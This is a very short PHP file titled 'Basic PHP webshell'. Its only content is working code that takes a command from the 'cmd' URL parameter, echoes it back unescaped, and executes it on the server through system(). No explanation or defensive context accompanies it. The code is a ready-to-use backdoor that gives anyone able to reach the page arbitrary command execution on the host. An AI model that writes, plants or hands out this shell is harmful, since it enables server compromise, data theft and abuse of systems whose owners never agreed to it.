Basic PHP webshell</br>

<?php
if(isset($_GET['cmd'])){
echo "Command: ";
echo $_GET['cmd'];
        echo "<pre>";
        $cmd = ($_GET['cmd']);
        system($cmd);
        echo "</pre>";
}
?> 
